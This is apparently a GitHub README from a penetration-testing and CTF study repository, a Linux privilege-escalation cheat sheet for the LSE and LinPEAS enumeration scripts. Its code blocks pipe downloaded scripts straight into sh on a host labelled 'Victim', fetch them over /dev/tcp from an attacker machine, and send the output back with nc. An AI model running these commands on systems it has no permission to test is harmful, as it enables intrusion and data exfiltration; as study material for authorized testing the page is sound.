> בס״ד
<div align="center">

<h2 align="center"><a href="https://github.com/Anlominus">⚜️ Aภl๏miuภuຮ ⚜️</a></h2>

<img align="center" width="100" src="https://user-images.githubusercontent.com/51442719/172729066-1293d382-4a31-4f03-8c23-ab0ea5f611a0.png">

⫷ [**`HacKingPro`**](https://github.com/Anlominus/HacKingPro) ⫸
<br>
⫷ [**`TryHackMe`**](https://github.com/Anlominus/TryHackMe) | [**`KoTH`**](https://github.com/Anlominus/TryHackMe/tree/main/King%20of%20the%20Hill/KoTH) ⫸ 
<br>
⫷ [**`ScanPro`**](https://github.com/Anlominus/ScanPro) | [**`Linfo`**](https://github.com/Anlominus/Linfo) | [**`Diablo`**](https://github.com/Anlominus/Diablo) ⫸ 
<br>
⫷ [**`Offensive-Security`**](https://github.com/Anlominus/Offensive-Security) | [**`PenTest`**](https://github.com/Anlominus/PenTest) ⫸
<br>
⫷ [**`Goals`**](https://github.com/Anlominus/Goals) | [**`Studies`**](https://github.com/Anlominus/Studies) | [**`HacKing`**](https://github.com/Anlominus/HacKing) | [**`AnyTeam`**](https://github.com/Anlominus/AnyTeam) ⫸
<br>

</div>
  
---
  
<div align="center">

# [`Privilege-Escalation`](https://github.com/Anlominus/Privilege-Escalation) ~> [`Linux-PrivEsc`](https://github.com/Anlominus/Linux-PrivEsc)
[**`Tools`**](https://github.com/Anlominus/Linux-PrivEsc/tree/main/GiTools#linux-privesc--gitools) | [**`Cheat Sheets`**](https://github.com/Anlominus/Linux-PrivEsc/tree/main/Cheat%20Sheets#linux-privesc--cheat-sheets) | [`Notes`](./Notes)  | [`Checklists`](./Checklists)
  
---

## Linux Enumeration 
  
### LSE
```shell
wget https://raw.githubusercontent.com/Anlominus/HacKingPro/main/Menu/14--Privilege%20Enumeration%20%26%20Escalation/lse.sh; chmod 777 lse.sh
```
### LinPEAS
```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh; chmod 777 linpeas.sh
```  
> ![image](https://user-images.githubusercontent.com/51442719/173901910-757fa5d0-0d72-4d2e-9df5-da64a886bc28.png)
> **LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)**
> ```bash
> # From github
> curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
> ```
</div>
  
> ```bash
> # Local network
> sudo python -m SimpleHTTPServer 80 #Host
> curl 10.10.10.10/linpeas.sh | sh #Victim
> 
> # Without curl
> sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
> cat < /dev/tcp/10.10.10.10/80 | sh #Victim
> 
> # Excute from memory and send output back to the host
> nc -lvnp 9002 | tee linpeas.out #Host
> curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
> ```

> ```bash
> # Output to file
> ./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
> less -r /dev/shm/linpeas.txt #Read with colors
> ```

> ```bash
> # Use a linpeas binary
> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
> chmod +x linpeas_linux_amd64
> ./linpeas_linux_amd64
> ```

</div>

